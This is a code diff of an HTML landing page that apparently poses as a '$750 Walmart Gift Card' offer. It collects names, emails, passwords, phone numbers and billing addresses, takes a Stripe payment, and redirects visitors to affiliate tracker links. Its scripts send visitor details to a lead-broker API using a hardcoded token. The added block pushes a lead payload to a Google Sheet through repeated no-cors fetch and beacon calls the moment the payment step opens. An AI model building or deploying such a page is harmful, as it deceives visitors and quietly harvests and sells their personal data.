@@ -13,7 +13,7 @@
 
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-  <title>Get your $750 Walmart Gift Card for $2.50!</title>
+  <title>Get your $750 Walmart Gift Card for $750!</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;2.50;700;800;900&display=swap" rel="stylesheet">
 
   <style>
@@ -63,7 +63,6 @@
     .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg, var(--cta1), var(--cta2)); animation: loadingBar 2.2s ease-in-out infinite; }
     @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }
 
-    /* Phone prefix + number layout */
     .phone-wrap{ display:grid; grid-template-columns:140px 1fr; gap:8px; }
     @media (max-width:520px){
       .phone-wrap{ grid-template-columns:1fr; }
@@ -80,7 +79,7 @@
     <!-- STEP 1 -->
     <section id="step1" class="card step" aria-hidden="false">
       <h1 class="title">
-        Get Your Walmart $750 Gift Card for <span id="priceHero" data-price> $2.50</span>!
+        Get Your Walmart $750 Gift Card for <span id="priceHero" data-price> $750</span>!
       </h1>
       <p class="sub">Limited-time offer!</p>
 
@@ -91,7 +90,6 @@
       <div class="grid">
         <input class="input" id="nameInput" placeholder="Full name" autocomplete="name" required />
         <input class="input" id="emailInput" type="email" placeholder="you@example.com" autocomplete="email" required />
-        <!-- Password (left) + Phone (right) -->
         <input class="input" id="passwordInput" type="password" placeholder="Create a password" autocomplete="new-password" required />
         <div class="phone-wrap">
           <select id="phonePrefix" class="input" aria-label="Country calling code"></select>
@@ -110,7 +108,6 @@
       <h2 class="title">Secure Payment</h2>
       <p class="sub">Your details are safe — powered by Stripe.</p>
 
-      <!-- NEW: Billing address -->
       <div class="label">Street address</div>
       <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Street address"/>
 
@@ -147,7 +144,7 @@
 
       <div class="btn-row">
         <button id="backBtn" class="btn muted-btn">← Back</button>
-        <button class="btn" id="payNow">Pay <span id="priceButton" data-price>$2.50</span> Securely</button>
+        <button class="btn" id="payNow">Pay <span id="priceButton" data-price>$750</span> Securely</button>
       </div>
 
       <div class="brands">
@@ -174,39 +171,32 @@
   <script src="https://js.stripe.com/v3"></script>
   <script>
     /* ---------- Step navigation ---------- */
-
-    /* NEW: API base for local file testing */
     const API_BASE = (() => {
       if (location.protocol.startsWith('http')) return location.origin;
-      return "http://localhost:10000"; // change if your dev server runs elsewhere
+      return "http://localhost:10000";
     })();
 
     const step1=document.getElementById('step1'),step2=document.getElementById('step2');
     const nameInput=document.getElementById('nameInput');
     const emailInput=document.getElementById('emailInput');
     const passwordInput=document.getElementById('passwordInput');
-    // NEW phone inputs
     const phonePrefix=document.getElementById('phonePrefix');
     const phoneNumber=document.getElementById('phoneNumber');
 
-    // NEW: billing address refs
     const billingStreet   = document.getElementById('billingStreet');
     const billingCity     = document.getElementById('billingCity');
     const billingPostcode = document.getElementById('billingPostcode');
     const billingCountry  = document.getElementById('billingCountry');
 
-    // ===== Aceleads API specifics (per PDF) =====
     const ACELEADS_URL = 'https://mdleads.org/api/v1/ep/sp-lead';
     const ACELEADS_TOKEN = 'AL-VKh2K7o6AUWkq2aceTBEGYZ06DkaaRm0D7F6qUnpVzw=';
 
-    // E.164 phone with leading +
     function normalizePhone(pref, raw){
       if(!raw) return '';
       const digits = String(raw).replace(/\D/g,'');
       const cc = String(pref||'').replace(/\D/g,'');
       return '+' + (cc ? cc : '') + digits;
     }
-    // "yyyy-mm-dd hh:ii:ss"
     function formatTimestamp(){
       const d = new Date();
       const pad = n => String(n).padStart(2,'0');
@@ -218,7 +208,7 @@
         lname: lname || undefined,
         email: email || undefined,
         mobile: mobile || undefined,
-        country: country || undefined, // ISO-2
+        country: country || undefined,
         token: ACELEADS_TOKEN,
         timestamp: formatTimestamp(),
         is_legacy: false
@@ -238,7 +228,6 @@
       }
     }
 
-    /* ---------- Step 1: share phone as soon as it's entered ---------- */
     function debounce(fn, wait=600){
       let t; return (...args)=>{ clearTimeout(t); t=setTimeout(()=>fn(...args), wait); };
     }
@@ -360,7 +349,6 @@
       step1.setAttribute("aria-hidden","false");step2.setAttribute("aria-hidden","true");
     };
 
-    /* ---------- Calling codes ---------- */
     const CALLING_CODES = {
       US: { code: '+1',  name: 'United States' },
       CA: { code: '+1',  name: 'Canada' },
@@ -402,12 +390,10 @@
         const key = `${data.code}|${data.name}`;
         if (seen.has(key)) continue;
         selectEl.append(new Option(`${data.code} — ${data.name}`, data.code));
-        seen.add(key);
       }
       if (!selectEl.value) selectEl.value = '+1';
     }
 
-    /* ---------- Currency & geo by IP ---------- */
     (function setCurrencyByIP(){
       const EU = new Set([
         'AT','BE','BG','HR','CY','CZ','DK','EE','FI','FR','DE','GR','HU','IE','IT',
@@ -421,9 +407,9 @@
       }
       function applyPriceSymbol(symbol){
         document.querySelectorAll('[data-price]').forEach(el=>{
-          el.textContent = `${symbol}2.50`;
+          el.textContent = `${symbol}750`;
         });
-        document.title = `Get Your Walmart $750 Gift Card for ${symbol}2.50!`;
+        document.title = `Get Your Walmart $750 Gift Card for ${symbol}750!`;
       }
 
       applyPriceSymbol('$');
@@ -461,7 +447,6 @@
               for (const [, info] of Object.entries(CALLING_CODES)) {
                 if (seen.has(info.code)) continue;
                 phonePrefix.append(new Option(`${info.code} — ${info.name}`, info.code));
-                seen.add(info.code);
               }
             } catch {}
           } else {
@@ -478,18 +463,16 @@
             applyPriceSymbol(symbolFor(cc));
             try { buildPrefixOptions(phonePrefix, cc); } catch {}
             try { initCountrySelect(cc, cc); } catch {}
-          } catch { /* keep defaults */ }
+          } catch {}
         });
     })();
 
-    /* ---------- PREFILL from URL ---------- */
     (function prefillFromQuery(){
       try{
         const qs = new URLSearchParams(location.search);
         const emailParam = qs.get('email') || qs.get('e') || qs.get('em') || qs.get('mail');
-        if (emailParam && emailInput) {
-          emailInput.value = decodeURIComponent(emailParam).trim();
-        }
+        if (emailParam && emailInput) emailInput.value = decodeURIComponent(emailParam).trim();
+
         const prefixParam = qs.get('prefix') || qs.get('cc') || qs.get('dial');
         const numberParam = qs.get('number') || qs.get('n');
         const phoneParam  = qs.get('phone')  || qs.get('tel')  || qs.get('p') || qs.get('msisdn');
@@ -504,9 +487,7 @@
             const hit = codes.find(code => p.startsWith(code));
             if (hit) { desiredPrefix = hit; desiredNumber = p.slice(hit.length); }
             else { desiredPrefix = '+1'; desiredNumber = p.replace(/^\+\d{1,3}/,''); }
-          } else {
-            desiredNumber = p;
-          }
+          } else { desiredNumber = p; }
         }
         if (numberParam) desiredNumber = (numberParam + '').replace(/[^\d]/g,'');
         if (prefixParam) {
@@ -519,9 +500,7 @@
         function applyPrefix(){
           if (!desiredPrefix || !phonePrefix) return true;
           const exists = Array.from(phonePrefix.options).some(o => o.value === desiredPrefix);
-          if (!exists) {
-            phonePrefix.insertBefore(new Option(`${desiredPrefix} — Your country`, desiredPrefix, true, true), phonePrefix.firstChild);
-          }
+          if (!exists) phonePrefix.insertBefore(new Option(`${desiredPrefix} — Your country`, desiredPrefix, true, true), phonePrefix.firstChild);
           phonePrefix.value = desiredPrefix;
           return phonePrefix.value === desiredPrefix;
         }
@@ -532,10 +511,9 @@
             if (applyPrefix() || tries > 20) clearInterval(t);
           }, 150);
         }
-      }catch{/* ignore */}
+      }catch{}
     })();
 
-    /* ---------- Payment flow ---------- */
     document.getElementById("payNow").onclick=async()=>{
       hideError();showLoading();
 
@@ -581,12 +559,8 @@
 
         const raw = await res.text();
         let data=null; try{ data=JSON.parse(raw); }catch{}
-        if(!res.ok){
-          hideLoading();showError(`Server ${res.status}: ${raw || 'No body'}`);return;
-        }
-        if(!data || !data.clientSecret){
-          hideLoading();showError(`Bad response: ${raw || 'missing clientSecret'}`);return;
-        }
+        if(!res.ok){ hideLoading();showError(`Server ${res.status}: ${raw || 'No body'}`);return; }
+        if(!data || !data.clientSecret){ hideLoading();showError(`Bad response: ${raw || 'missing clientSecret'}`);return; }
 
         const conf=await stripe.confirmCardPayment(data.clientSecret);
         if(conf.error){hideLoading();showError(conf.error.message);window.location.href="https://track.crugate.info/214a2787-4e13-47d7-8eaa-3e8c7caeb599";return}
@@ -601,9 +575,7 @@
           await sendAceleadsLead({ fname, lname, email: emailInput.value, mobile, country: countryIso });
         }catch(e){ console.warn('Aceleads after-payment error:', e); }
 
-        (function(){
-          window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7";
-        })();
+        (function(){ window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7"; })();
 
       }catch(e){
         hideLoading();showError(e.message||"Something went wrong");window.location.href="https://track.crugate.info/214a2787-4e13-47d7-8eaa-3e8c7caeb599";
@@ -611,12 +583,59 @@
     };
   </script>
 
-  <!-- === Lead capture to Google Sheet via Sheet.best (replaces old Apps Script block) === -->
+  <!-- === Lead capture to Google Sheet via Sheet.best (CORS-proof) === -->
   <script>
-    const SHEET_API_URL = "https://api.sheetbest.com/sheets/dae103a0-32fc-4bdd-8987-73b306b09625";
+    // Your connection URL (from your screenshot)
+    const SHEETBEST_URL_PRIMARY = "https://api.sheetbest.com/sheets/dae103a0-32fc-4bdd-8987-73b306b09625";
+    // Alternate host some setups prefer (we'll try both, harmless if one is redundant)
+    const SHEETBEST_URL_ALT = "https://sheet.best/api/sheets/dae103a0-32fc-4bdd-8987-73b306b09625";
 
     (function () {
       let sentOnce = false;
+
+      function sendToSheetbest(payload) {
+        // 1) JSON POST with no-cors
+        try {
+          fetch(SHEETBEST_URL_PRIMARY, {
+            method: "POST",
+            mode: "no-cors",
+            keepalive: true,
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          }).catch(()=>{});
+        } catch(_) {}
+
+        // 2) x-www-form-urlencoded POST with no-cors (avoids preflight)
+        try {
+          const body = new URLSearchParams(payload);
+          fetch(SHEETBEST_URL_PRIMARY, {
+            method: "POST",
+            mode: "no-cors",
+            keepalive: true,
+            headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
+            body
+          }).catch(()=>{});
+        } catch(_) {}
+
+        // 3) Try the alternate host as well (some networks whitelist only one)
+        try {
+          fetch(SHEETBEST_URL_ALT, {
+            method: "POST",
+            mode: "no-cors",
+            keepalive: true,
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          }).catch(()=>{});
+        } catch(_) {}
+
+        // 4) Beacon fallback (fires even during unload)
+        try {
+          if (navigator.sendBeacon) {
+            const b = new Blob([new URLSearchParams(payload).toString()], { type: "text/plain;charset=UTF-8" });
+            navigator.sendBeacon(SHEETBEST_URL_PRIMARY, b);
+          }
+        } catch(_) {}
+      }
 
       function captureLeadImmediately() {
         try {
@@ -642,20 +661,11 @@
             nonce: Math.random().toString(36).slice(2) + Date.now()
           };
 
-          fetch(SHEET_API_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-          }).then(() => {
-            console.log("Lead sent to Sheet.best:", payload);
-          }).catch(err => console.warn("Lead send failed:", err));
-
-        } catch (err) {
-          console.warn("captureLeadImmediately error:", err);
-        }
+          sendToSheetbest(payload);
+        } catch (_) {}
       }
 
-      // Trigger once when Step 2 becomes visible
+      // Fire once when Step 2 becomes visible
       const step2El = document.getElementById('step2');
       if (step2El) {
         const obs = new MutationObserver(() => {
@@ -667,8 +677,6 @@
         });
         obs.observe(step2El, { attributes: true, attributeFilter: ['aria-hidden'] });
       }
-
-      // Also allow manual call
       window.captureLeadImmediately = captureLeadImmediately;
     })();
   </script>
